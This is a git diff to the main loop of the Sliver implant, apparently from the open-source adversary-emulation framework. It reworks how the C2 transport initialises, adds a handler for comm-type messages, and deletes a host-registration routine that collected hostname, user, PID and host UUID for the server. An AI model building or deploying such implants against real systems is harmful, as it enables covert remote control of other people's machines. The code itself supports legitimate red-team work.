@@ -25,10 +25,6 @@ import "C"
 // {{end}}
 
 import (
-	"os"
-	"os/user"
-	"runtime"
-	"time"
 
 	// {{if .Config.Debug}}{{else}}
 	"io/ioutil"
@@ -36,22 +32,22 @@ import (
 
 	"log"
 
+	// {{if .Config.Debug}}
+	"github.com/bishopfox/sliver/implant/sliver/constants"
+	// {{end}}
+
+	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+
 	// {{end}}
 
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/handlers"
-	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/implant/sliver/version"
-
-	"github.com/golang/protobuf/proto"
 
 	// {{if .Config.IsService}}
 	"golang.org/x/sys/windows/svc"
@@ -68,11 +64,14 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 	for {
 		select {
 		default:
-			connection := transports.StartConnectionLoop()
-			if connection == nil {
+			err := transports.Transports.Init()
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Error starting transports: %s", err.Error())
+				// {{end}}
 				break
 			}
-			mainLoop(connection)
+			mainLoop(transports.Transports.Server.C2)
 		case c := <-r:
 			switch c.Cmd {
 			case svc.Interrogate:
@@ -139,7 +138,7 @@ func main() {
 	// {{end}}
 
 	// {{if .Config.Debug}}
-	log.Printf("Hello my name is %s", consts.SliverName)
+	log.Printf("Hello my name is %s", constants.SliverName)
 	// {{end}}
 
 	limits.ExecLimits() // Check to see if we should execute
@@ -148,18 +147,19 @@ func main() {
 	svc.Run("", &sliverService{})
 	// {{else}}
 	for {
-		connection := transports.StartConnectionLoop()
-		if connection == nil {
+		err := transports.Transports.Init()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error starting transports: %s", err.Error())
+			// {{end}}
 			break
 		}
-		mainLoop(connection)
+		mainLoop(transports.Transports.Server.C2)
 	}
 	// {{end}}
 }
 
 func mainLoop(connection *transports.Connection) {
-
-	connection.Send <- getRegisterSliver() // Send registration information
 
 	// Reconnect active pivots
 	pivots.ReconnectActivePivots(connection)
@@ -169,6 +169,7 @@ func mainLoop(connection *transports.Connection) {
 	sysHandlers := handlers.GetSystemHandlers()
 	sysPivotHandlers := handlers.GetSystemPivotHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
+	commHandlers := handlers.GetCommHandlers()
 
 	for envelope := range connection.Recv {
 		if handler, ok := specialHandlers[envelope.Type]; ok {
@@ -218,6 +219,11 @@ func mainLoop(connection *transports.Connection) {
 			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
+		} else if handler, ok := commHandlers[envelope.Type]; ok {
+			// {{if .Config.Debug}}
+			log.Printf("[recv] commHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
 		} else {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
@@ -228,73 +234,5 @@ func mainLoop(connection *transports.Connection) {
 				UnknownMessageType: true,
 			}
 		}
-	}
-}
-
-func getRegisterSliver() *sliverpb.Envelope {
-	hostname, err := os.Hostname()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to determine hostname %s", err)
-		// {{end}}
-		hostname = ""
-	}
-	currentUser, err := user.Current()
-	if err != nil {
-
-		// {{if .Config.Debug}}
-		log.Printf("Failed to determine current user %s", err)
-		// {{end}}
-
-		// Gracefully error out
-		currentUser = &user.User{
-			Username: "<< error >>",
-			Uid:      "<< error >>",
-			Gid:      "<< error >>",
-		}
-
-	}
-	filename, err := os.Executable()
-	// Should not happen, but still...
-	if err != nil {
-		//TODO: build the absolute path to os.Args[0]
-		if 0 < len(os.Args) {
-			filename = os.Args[0]
-		} else {
-			filename = "<< error >>"
-		}
-	}
-
-	// Retrieve UUID
-	uuid := hostuuid.GetUUID()
-	// {{if .Config.Debug}}
-	log.Printf("Uuid: %s", uuid)
-	// {{end}}
-
-	data, err := proto.Marshal(&sliverpb.Register{
-		Name:              consts.SliverName,
-		Hostname:          hostname,
-		Uuid:              uuid,
-		Username:          currentUser.Username,
-		Uid:               currentUser.Uid,
-		Gid:               currentUser.Gid,
-		Os:                runtime.GOOS,
-		Version:           version.GetVersion(),
-		Arch:              runtime.GOARCH,
-		Pid:               int32(os.Getpid()),
-		Filename:          filename,
-		ActiveC2:          transports.GetActiveC2(),
-		ReconnectInterval: uint32(transports.GetReconnectInterval() / time.Second),
-		ProxyURL:          transports.GetProxyURL(),
-	})
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to encode register msg %s", err)
-		// {{end}}
-		return nil
-	}
-	return &sliverpb.Envelope{
-		Type: sliverpb.MsgRegister,
-		Data: data,
 	}
 }
